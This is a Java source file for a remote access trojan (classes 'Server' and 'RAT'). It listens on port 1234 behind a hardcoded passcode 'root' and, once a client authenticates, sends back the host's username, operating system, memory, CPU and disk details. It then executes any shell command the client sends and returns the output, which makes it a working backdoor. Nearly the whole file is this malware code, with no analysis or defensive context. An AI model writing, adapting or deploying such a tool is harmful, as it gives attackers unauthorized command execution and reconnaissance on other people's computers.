import java.util.Scanner;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.lang.management.*;
import java.io.File;


class Server {
	public static void main ( String[] args ) throws Exception {
		int port = 1234;
		String endSignal = "**";
		RAT rat = new RAT(port, endSignal);
		while( true ) {
			rat.startServer();
		}
	}
}


//Composite class
class Authentication {
	String passcode = "root";
	
	public boolean authenticateRequest( String passcode ) {
		if( this.passcode.equals( passcode ) ) {
			return true;
		}
		else {
			return false;
		}
	}
}

class RAT {
	int port;
	String endSignal;
	
	RAT( int port, String endSignal ) {
		this.port = port;
		this.endSignal = endSignal;
	}

	//Authenticating the Client
	boolean authUser( String passcode, PrintWriter printWriter ) {
		//Composition
		Authentication auth = new Authentication();
		
		if( auth.authenticateRequest( passcode ) ) {
			printWriter.println( "Access Granted" );
			printWriter.flush();
			return true;
		}
		else {
			printWriter.println( "Access Denied" );
			printWriter.flush();
			return false;
		}
	}
	
	void sysInfo(Socket socket, PrintWriter printWriter) {
		String username = System.getProperty( "user.name" );
		String os = System.getProperty( "os.name" ).toLowerCase();
		long ram_capacity = ( ( (com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean(    )).getTotalPhysicalMemorySize() );
		int cores = Runtime.getRuntime().availableProcessors();
		
		String absolutePath;
		long totalSpace, freeSpace, usableSpace;
		
		
		printWriter.println( username );
		printWriter.flush();
		printWriter.println( os );
		printWriter.flush();
		printWriter.println( ram_capacity );
		printWriter.flush();
		printWriter.println( cores );
		printWriter.flush();
		
		File[] roots = File.listRoots();
		for( File root : roots ) {
			printWriter.println( root.getAbsolutePath() );
			printWriter.flush();
			printWriter.println( root.getTotalSpace() );
			printWriter.flush();
			printWriter.println( root.getFreeSpace() );
			printWriter.flush();
			printWriter.println( root.getUsableSpace() );
			printWriter.flush();
		}
	}		

	void startServer() {
		try {
			ServerSocket serverSocket = new ServerSocket( this.port );

			while( !serverSocket.isClosed() ) {
				Socket socket = serverSocket.accept();

				try {
					BufferedReader br = new BufferedReader( new InputStreamReader(socket.getInputStream()) );
					PrintWriter printWriter = new PrintWriter( socket.getOutputStream() );
					
					String passcode = br.readLine();
					if(  authUser(passcode, printWriter) ) {

						sysInfo(socket, printWriter);
						boolean flag = false, server_flag = false;
						
						while( !socket.isClosed() ) {
							String cmd = br.readLine();
							
							if( cmd.equals("exit") ) {
								flag = true;
								break;
							}
				
							if( cmd.equals("exit-server") ) {
								flag = true;
								server_flag = true;
								break;
							}
							
							try {
								Process p = Runtime.getRuntime().exec(cmd);
								BufferedReader buf = new BufferedReader ( new InputStreamReader (p.getInputStream()) );
								buf.lines().forEach(s -> {
                                	                                        try {
                                        	                                        printWriter.println( s );
                                                	                        } catch (Exception e) {
                                                        	                        e.printStackTrace();
                                                                	        }
                                                                        	printWriter.flush();
	                                                        });
        	                                  	}
							catch ( Exception ex ) {
                                                        	ex.printStackTrace();
	                                                        printWriter.println ( ex.getMessage() );
        	                                                printWriter.flush();
                		                        }
						
							printWriter.println ( endSignal );
	     						printWriter.flush();
						}
						
						if( flag ) {
							br.close();
							printWriter.close();
							socket.close();
							serverSocket.close();
							if( server_flag ) {
								System.exit( 0 );
							}
							return;
						}
				
					}
					else {
						br.close();
						printWriter.close();
						socket.close();
						serverSocket.close();
						return;
					}
				}
				catch ( Exception ex ) {
        	                        ex.printStackTrace();
                	        }
			}
		}
		catch( Exception ex ) {
			ex.printStackTrace();
		}
		
	}
	
	
}

